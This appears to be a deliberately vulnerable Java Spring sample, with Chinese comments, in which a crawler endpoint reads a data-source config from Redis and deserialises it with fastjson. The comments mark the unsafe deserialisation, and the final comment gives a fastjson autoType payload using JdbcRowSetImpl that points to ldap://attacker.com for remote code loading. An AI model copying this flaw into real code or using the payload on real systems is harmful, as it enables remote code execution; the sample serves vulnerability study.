package com.example.crawler.datasource;

import com.alibaba.fastjson.JSON;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import java.io.Serializable;

// 聚合根：动态数据源配置
@lombok.Data
public class DynamicDataSourceModel implements Serializable {
    private String dbKey;
    private String dbType;
    private String jdbcUrl;
    private String username;
    private String password;
}

// 仓储接口
interface DataSourceRepository {
    DynamicDataSourceModel getCacheDynamicDataSourceModel(String dbKey);
}

// Redis仓储实现
@Service
class RedisDataSourceRepository implements DataSourceRepository {
    @Resource
    private RedisTemplate<String, Object> redisTemplate;

    @Override
    public DynamicDataSourceModel getCacheDynamicDataSourceModel(String dbKey) {
        // 漏洞点：直接使用用户输入构造缓存键
        String cacheKey = "DS_CONFIG:" + dbKey;
        
        // 不安全的反序列化操作
        Object cached = redisTemplate.opsForValue().get(cacheKey);
        if (cached instanceof String) {
            // 危险操作：直接反序列化不可信数据
            return JSON.parseObject((String) cached, DynamicDataSourceModel.class);
        }
        return (DynamicDataSourceModel) cached;
    }
}

// 应用服务
@Service
class CrawlerService {
    @Resource
    private DataSourceRepository dataSourceRepository;

    public void crawl(@RequestParam String dbKey) {
        // 获取数据源配置（可能触发反序列化）
        DynamicDataSourceModel model = dataSourceRepository.getCacheDynamicDataSourceModel(dbKey);
        
        // 模拟使用数据源进行爬虫操作
        System.out.println("Crawling with datasource: " + model.getJdbcUrl());
    }
}

// 控制器
@RestController
@RequestMapping("/crawl")
class CrawlerController {
    @Resource
    private CrawlerService crawlerService;

    @GetMapping
    public void handleCrawl(@RequestParam String dbKey) {
        // 用户输入直接传递给业务层
        crawlerService.crawl(dbKey);
    }
}

// 漏洞利用示例：
// 攻击者发送请求：/crawl?dbKey=malicious
// 并预先在Redis的DS_CONFIG:malicious键中注入：
// {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/x"}